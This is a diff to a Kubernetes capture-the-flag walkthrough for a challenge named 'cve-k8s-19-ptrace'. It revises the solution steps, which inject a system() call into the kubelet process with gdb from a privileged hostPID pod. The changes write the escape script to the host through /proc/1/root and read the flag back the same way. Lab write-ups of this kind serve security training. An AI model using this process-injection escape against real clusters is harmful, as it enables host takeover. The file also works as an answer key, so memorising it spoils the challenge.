@@ -24,7 +24,7 @@
 | Difficulty | L3 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-19-ptrace |
-| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |
+| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; reachable only via host process injection) |
 
 ## Attack Path Summary
 1. Pod runs with `CAP_SYS_PTRACE` and `CAP_SYS_ADMIN` capabilities, `hostPID: true`
@@ -118,7 +118,9 @@ $1 = 0
 
 ### Step 5: Read the Flag
 ```bash
-cat /tmp/flag_out.txt
+# The injected system() call ran inside kubelet (host context), so the output
+# file is on the host. Read it through the hostPID /proc view:
+cat /proc/1/root/tmp/flag_out.txt
 # Expected: flag{k8s-19-*}
 ```
 
@@ -126,10 +128,10 @@ cat /tmp/flag_out.txt
 For a more interactive foothold on the host:
 
 ```bash
-# Write a reverse shell script first
+# Write the script to the HOST filesystem (kubelet will execute it from host /tmp)
 echo '#!/bin/bash
-cat /host-flag/flag.txt > /tmp/flag_out.txt' > /tmp/escape.sh
-chmod +x /tmp/escape.sh
+cat /host-flag/flag.txt > /tmp/flag_out.txt' > /proc/1/root/tmp/escape.sh
+chmod +x /proc/1/root/tmp/escape.sh
 
 # Inject execution
 gdb -p $KUBELET_PID -batch -ex "call (int)system(\"bash /tmp/escape.sh\")"
